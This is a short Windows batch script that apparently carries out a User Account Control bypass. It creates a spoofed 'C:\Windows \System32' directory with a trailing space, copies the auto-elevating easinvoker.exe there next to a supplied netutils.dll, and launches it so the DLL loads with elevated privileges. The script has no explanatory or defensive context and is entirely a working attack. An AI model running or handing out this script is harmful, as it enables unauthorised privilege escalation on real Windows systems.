@echo off
mkdir "\\?\C:\Windows " 
mkdir "\\?\C:\Windows \System32"
copy "C:\Windows\System32\easinvoker.exe" "C:\Windows \System32\"
copy "netutils.dll" "C:\Windows \System32\"
"C:\Windows \System32\easinvoker.exe"

